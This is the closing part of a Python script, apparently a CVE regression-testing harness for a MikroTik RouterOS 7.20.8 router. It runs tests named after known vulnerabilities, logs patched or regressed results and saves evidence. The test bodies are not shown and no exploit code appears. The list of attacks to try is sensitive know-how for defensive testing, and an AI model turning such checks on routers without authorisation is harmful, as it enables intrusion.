            status_mark = "[CONFIRMED]"
        elif "MITIGATED" in result:
            patched += 1
            status_mark = "[MITIGATED]"
        else:
            status_mark = f"[{result}]"

        log(f"  {cve_id:<20} {severity:<12} {status_mark} {desc}")

    log("-" * 80)
    log(f"  PATCHED/MITIGATED: {patched}  |  REGRESSION/CONFIRMED: {regressed}  |  "
        f"UNTESTABLE: {untestable}")
    log("=" * 80)

    # Add summary to evidence
    ec.add_test("summary", "cve_regression_summary",
                 "Overall CVE regression testing summary",
                 f"Patched: {patched}, Regression: {regressed}, "
                 f"Untestable: {untestable}",
                 details={"cve_results": cve_results,
                          "cve_info": {k: {"severity": v[0], "description": v[1]}
                                       for k, v in cve_info.items()},
                          "patched": patched, "regression": regressed,
                          "untestable": untestable},
                 anomaly=(regressed > 0))


# =============================================================================
# MAIN
# =============================================================================

def main():
    log("=" * 60)
    log("MikroTik RouterOS CHR 7.20.8 -- CVE Regression Testing")
    log(f"Target: {TARGET}")
    log(f"Phase 8 -- cve_regression.py")
    log("=" * 60)

    # Pre-flight check
    status = check_router_alive()
    if not status.get("alive"):
        log("FATAL: Router is not responding. Aborting.")
        sys.exit(1)
    log(f"Router alive: version={status.get('version')}, "
        f"uptime={status.get('uptime')}")

    # Run all CVE regression tests
    cve_tests = [
        ("CVE-2025-10948 (REST API JSON Buffer Overflow)", test_cve_2025_10948),
        ("CVE-2025-61481 (WebFig Cleartext HTTP Creds)", test_cve_2025_61481),
        ("CVE-2024-54772 (Winbox Username Enumeration)", test_cve_2024_54772),
        ("CVE-2023-41570 (REST API ACL Bypass)", test_cve_2023_41570),
        ("CVE-2023-30799 (Privilege Escalation FOISted)", test_cve_2023_30799),
        ("CVE-2018-14847 (Winbox Pre-Auth File R/W)", test_cve_2018_14847),
        ("CVE-2018-7445 (SMB Buffer Overflow)", test_cve_2018_7445),
        ("CVE-2019-3943 (FTP Directory Traversal)", test_cve_2019_3943),
        ("Hotspot XSS", test_hotspot_xss),
        ("CVE-2019-3924 (Unauthenticated DNS Proxy)", test_cve_2019_3924),
        ("CVE-2019-3976 (Firmware Down[REDACTED])", test_cve_2019_3976),
    ]

    for cve_name, test_func in cve_tests:
        try:
            test_func()
        except Exception as e:
            log(f"ERROR in {cve_name}: {e}")
            import traceback
            traceback.print_exc()
            ec.add_test("error", f"section_error_{cve_name[:30]}",
                         f"Unhandled error in {cve_name}",
                         f"Error: {str(e)[:300]}",
                         anomaly=True)

        # Health check between CVEs
        health = check_router_alive()
        if not health.get("alive"):
            log(f"WARNING: Router not responding after {cve_name}. Waiting...")
            wait_for_router(max_wait=60, check_interval=5)

    # Print summary table
    print_summary_table()

    # Save evidence and pull logs
    log("")
    ec.save("cve_regression.json")
    ec.summary()
    log("Done.")


if __name__ == "__main__":
    main()
